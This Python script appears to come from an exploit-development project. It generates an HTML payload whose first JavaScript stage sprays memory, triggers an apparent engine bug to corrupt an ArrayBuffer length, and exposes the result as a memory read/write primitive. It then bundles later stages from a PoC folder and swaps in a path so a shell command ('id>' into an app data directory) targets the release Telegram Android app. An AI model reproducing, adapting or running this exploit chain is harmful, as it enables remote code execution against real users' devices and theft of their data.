#!/usr/bin/env python3
"""Generate the bidirectional route-2 stage A / device widget for 72801.

Usage: python3 gen_s2b.py OUT.html [--np 1800] [--nq 2400] [--n2 415] [--dev]
       (default: device widget, dynamic Android endgame, release CMD)
"""
import argparse, re, subprocess, sys, zlib, os

SRC = '''"use strict";
/* Route-2 bidirectional (72801 port) stage A: spray on both sides of b so
 * the +20-slab OOB target is inside the arena spray for either mmap
 * direction.  b is created between the pre- and the post-spray. */
var NP = %d, NQ = %d, N2 = %d, FS = 488;
var SY = new Array(65600);
for (var i = 0; i < 65600; i++) SY[i] = Symbol();
var KEEP = SY.slice(65600 - 3000); SY = null;
var RT = [4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0];
var RJ = [4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
var PB = new Uint8Array(FS);
var A = new Array(NP + NQ), U = new Array(NP + NQ);
for (var i = 0; i < NP; i++) { A[i] = new ArrayBuffer(FS); U[i] = new Uint8Array(A[i]); }
var B = new Array(N2), V2 = new Array(N2);
for (var i = 0; i < N2; i++) { B[i] = new ArrayBuffer(320); V2[i] = new Uint8Array(B[i]); }
var S = '"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 0; };';
(0, eval)(S);
for (var i = NP; i < NP + NQ; i++) { A[i] = new ArrayBuffer(FS); U[i] = new Uint8Array(A[i]); }
var D = new Array(600);
for (var i = 0; i < 600; i++) D[i] = new ArrayBuffer(64);
var T = new Array(600);
for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
T[598] = null;
function fill(p, q) {
  PB.fill(0);
  for (var o = p; o + 40 <= FS; o += 40) {
    for (var k = 0; k < 20; k++) { PB[o+k] = (q ? RJ[k] : RT[k]); PB[o+20+k] = (q ? RT[k] : RJ[k]); }
  }
  for (var i = 0; i < NP + NQ; i++) U[i].set(PB);
}
var mark = "NOCORR", hit = 0, NT = 0;
for (var ph = 0; ph < 20 && !hit; ph += 4) {
  for (var q = 0; q < 2 && !hit; q++) {
    fill(ph, q);
    try { f(); } catch (e) {}
    NT++;
    for (var i = 0; i < 600; i++) {
      if (T[i] !== null && T[i].byteLength > 1024) {
        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength + " ph=" + ph + " q=" + q + " n=" + NT;
        break;
      }
    }
  }
}
var V = null, VAB = null;
for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
'''


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('out')
    ap.add_argument('--np', type=int, default=1800)
    ap.add_argument('--nq', type=int, default=2400)
    ap.add_argument('--n2', type=int, default=415)
    ap.add_argument('--host', action='store_true',
                    help='append the throw for the host harness and use the host endgame')
    a = ap.parse_args()

    src = SRC % (a.np, a.nq, a.n2)
    if a.host:
        src += 'throw new Error("RESULT " + mark);\n'
    open('/tmp/opencode/_s2b_gen.js', 'w').write(src)
    mn = subprocess.run(['terser', '/tmp/opencode/_s2b_gen.js', '-c', 'passes=2', '-m'],
                        capture_output=True, text=True)
    if mn.returncode != 0:
        sys.exit(mn.stderr)
    A = mn.stdout.strip()

    base = os.path.join(os.path.dirname(os.path.abspath(__file__)))
    if a.host:
        host = open(os.path.join(base, '..', 'qjs_fork_audit', 'mte_route2_20261108',
                                 'poc', 's2_full_g9_host.html')).read()
        m = dict((n, s) for n, s in re.findall(r'<script id="([^"]+)">(.*?)</script>', host, re.S))
        B, C = m['stageB'], m['stageC']
    else:
        dev = open(os.path.join(base, '..', 'qjs_fork_audit', 'mte_route2_20261108',
                                'poc', 's2_device_candidate.html')).read()
        m = dict((n, s) for n, s in re.findall(r'<script id="([^"]+)">(.*?)</script>', dev, re.S))
        B = m['stageB'].replace('id>/data/data/org.telegram.messenger.beta/files/n1',
                                'id>/data/data/org.telegram.messenger/files/n1')
        C = m['stageC']

    html = ('<!doctype html><body><div id="v">Ok</div>'
            '<script id="stageA">' + A + '</script>'
            '<script id="stageB">' + B + '</script>'
            '<script id="stageC">' + C + '</script>')
    open(a.out, 'w').write(html)
    print('%s raw %d zlib9 %d' % (a.out, len(html), len(zlib.compress(html.encode(), 9))))


if __name__ == '__main__':
    main()
